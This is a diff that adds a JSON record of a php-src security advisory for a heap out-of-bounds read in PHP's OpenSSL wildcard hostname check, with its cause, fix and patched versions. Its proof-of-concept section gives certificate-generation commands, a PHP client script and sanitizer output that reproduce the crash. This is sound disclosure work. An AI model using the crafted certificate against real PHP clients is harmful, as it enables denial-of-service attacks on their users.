@@ -1,0 +1,74 @@
+{
+  "global": null,
+  "id": "GHSA-xr7j-rvgx-xq5p",
+  "repo": {
+    "cve_id": "CVE-2026-91767",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 6.5,
+        "vector_string": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-122"
+    ],
+    "description": "### Summary\r\n\r\n`php_openssl_matches_wildcard_name()` in `ext/openssl/xp_ssl.c` underflows the length argument passed to `memchr()` when a TLS server certificate presents a wildcard name whose literal characters are together longer than the hostname being verified. A malicious server presenting such a certificate makes the PHP client read up to `SIZE_MAX` bytes past the end of a heap allocation. The path is reachable from any default client stream, because `verify_peer_name` is enabled by default.\r\n\r\n### Details\r\n\r\nThe guard before the `memchr()` call only accounts for the suffix length:\r\n\r\nhttps://github.com/php/php-src/blob/php-8.5.10/ext/openssl/xp_ssl.c#L435-L441\r\n\r\nThe third argument is `subject_len - suffix_len - prefix_len`. `subject_len` and `suffix_len` are `size_t` while `prefix_len` is `ptrdiff_t`, so the usual arithmetic conversions promote the whole expression to `size_t`. With a certificate name of `aaa*aa` verified against `aaaa`, the prefix is 3 and the suffix is 2 against a 4-byte subject, so the length computes as `(size_t)(4 - 2 - 3)` and wraps to `SIZE_MAX`. `memchr()` then scans from `subjectname + prefix_len` until it finds a `.` or hits unmapped memory.\r\n\r\nThe fix makes `prefix_len` a `size_t` and changes the guard to `suffix_len + prefix_len <= subject_len`, so the subtraction can no longer wrap.\r\n\r\n### PoC\r\n\r\nCreate a CA and a server certificate whose CN is a wildcard pattern longer than the hostname:\r\n\r\n```sh\r\nmkdir -p /tmp/tls-poc && cd /tmp/tls-poc\r\nopenssl req -x509 -newkey rsa:2048 -keyout ca.key -out ca.crt -days 30 -nodes -subj \"/CN=poc-ca\"\r\nopenssl req -newkey rsa:2048 -keyout server.key -out server.csr -nodes -subj \"/CN=aaa*aa\"\r\nopenssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out server.crt -days 30\r\n```\r\n\r\nServe it from a local TLS listener, then run the client with a shorter `peer_name`:\r\n\r\n```php\r\n<?php\r\n$ctx = stream_context_create([\r\n    'ssl' => [\r\n        'verify_peer'      => true,\r\n        'verify_peer_name' => true,\r\n        'cafile'           => '/tmp/tls-poc/ca.crt',\r\n        'peer_name'        => 'aaaa',\r\n    ],\r\n    'http' => ['method' => 'GET', 'timeout' => 5],\r\n]);\r\n$body = @file_get_contents('https://127.0.0.1:18443/', false, $ctx);\r\nvar_dump(error_get_last());\r\n```\r\n\r\n```sh\r\nUSE_ZEND_ALLOC=0 ASAN_OPTIONS=detect_leaks=0:halt_on_error=0 ./sapi/cli/php repro.php\r\n```\r\n\r\n```\r\n==3801043==ERROR: AddressSanitizer: heap-buffer-overflow\r\nREAD of size 6559 at 0x50300003eac0 thread T0\r\n0x50300003eac0 is located 0 bytes after 32-byte region [0x50300003eaa0,0x50300003eac0)\r\n    #1 php_openssl_matches_wildcard_name ext/openssl/xp_ssl.c:438\r\n    #2 php_openssl_matches_common_name ext/openssl/xp_ssl.c:542\r\n    #3 php_openssl_apply_peer_verification_policy ext/openssl/xp_ssl.c:635\r\n    #4 php_openssl_enable_crypto ext/openssl/xp_ssl.c:1894\r\n```\r\n\r\n`USE_ZEND_ALLOC=0` is needed so that AddressSanitizer sees the boundary of the heap-allocated peer name; with the Zend allocator the read still happens but stays inside a pre-allocated chunk. In a production build without a sanitizer the scan continues through the libc heap until it finds a `.` or reaches an unmapped page and the process crashes.\r\n\r\n### Impact\r\n\r\nA server that a PHP client connects to over TLS can cause an out-of-bounds read of unbounded length during hostname verification, crashing the process and producing a denial of service. The scan stops at the first `.` byte it encounters and its result only feeds the accept or reject decision, so no heap content is returned to the attacker.\r\n\r\nIt applies to any client stream using the default `verify_peer_name`, including `file_get_contents()`, `fopen()` and `stream_socket_client()` on `https://` and `tls://`. The attacker must be able to present the crafted certificate, either by controlling the server or by being trusted through the CA in use.\r\n",
+    "ghsa_id": "GHSA-xr7j-rvgx-xq5p",
+    "html_url": "https://github.com/php/php-src/security/advisories/GHSA-xr7j-rvgx-xq5p",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-xr7j-rvgx-xq5p"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-91767"
+      }
+    ],
+    "published_at": "2026-09-24T10:06:47Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "Heap-buffer-overflow in php_openssl_matches_wildcard_name on crafted server cert wildcard CN",
+    "updated_at": "2026-09-25T20:49:54Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-openssl"
+        },
+        "patched_versions": "8.2.34",
+        "vulnerable_version_range": "<8.2.34"
+      },
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-openssl"
+        },
+        "patched_versions": "8.3.35",
+        "vulnerable_version_range": "<8.3.35"
+      },
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-openssl"
+        },
+        "patched_versions": "8.4.26",
+        "vulnerable_version_range": "<8.4.26"
+      },
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-openssl"
+        },
+        "patched_versions": "8.5.11",
+        "vulnerable_version_range": "<8.5.11"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "php/php-src"
+}
